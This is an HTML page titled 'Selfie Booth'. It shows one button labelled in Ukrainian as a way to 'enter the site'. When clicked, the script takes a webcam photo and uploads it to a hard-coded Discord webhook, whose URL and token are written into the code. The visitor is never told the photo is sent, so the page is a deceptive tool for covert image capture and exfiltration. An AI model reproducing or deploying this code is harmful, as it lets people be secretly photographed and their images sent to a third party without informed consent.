<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Selfie Booth</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        button {
            font-size: 16px;
            padding: 10px 20px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <button id="take-selfie-button">Нажми щоб зайти на сайт!</button>

    <script>
        // Функція для зроблення фото селфі
        function takeSelfie() {
            // Отримання доступу до веб-камери
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    // Створення об'єкта ImageCapture з потоку відео
                    const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);

                    // Захоплення фото
                    imageCapture.takePhoto()
                        .then(function(blob) {
                            // Створення FormData об'єкту для передачі файлу
                            const formData = new FormData();
                            formData.append('file', blob, 'selfie.png');

                            // URL вашого вебхуку Discord
                            const webhookURL = 'https://discord.com/api/webhooks/1229473200568795136/_ESI3TX1M9LTN3C0c4wydkCkjR9a80btYNguPs96N3RF2y6zyJrxoMKpIrIRJrZgv7P0';

                            // Відправка POST-запиту на вебхук Discord
                            fetch(webhookURL, {
                                method: 'POST',
                                body: formData,
                            })
                            .then(response => {
                                if (!response.ok) {
                                    console.error('Помилка відправлення фото на вебхук Discord:', response.status, response.statusText);
                                } else {
                                    console.log('Фото успішно відправлено на вебхук Discord');
                                }
                            })
                            .catch(error => {
                                console.error('Помилка відправлення фото на вебхук Discord:', error);
                            });

                            // Зупинка потоку відео
                            stream.getVideoTracks()[0].stop();
                        })
                        .catch(function(error) {
                            console.error('Помилка захоплення фото:', error);
                            // Зупинка потоку відео у випадку помилки
                            stream.getVideoTracks()[0].stop();
                        });
                })
                .catch(function(error) {
                    console.error('Помилка доступу до веб-камери:', error);
                });
        }

        // Додавання обробника подій для кнопки "Зробити селфі"
        document.getElementById('take-selfie-button').addEventListener('click', takeSelfie);
    </script>
</body>
</html>
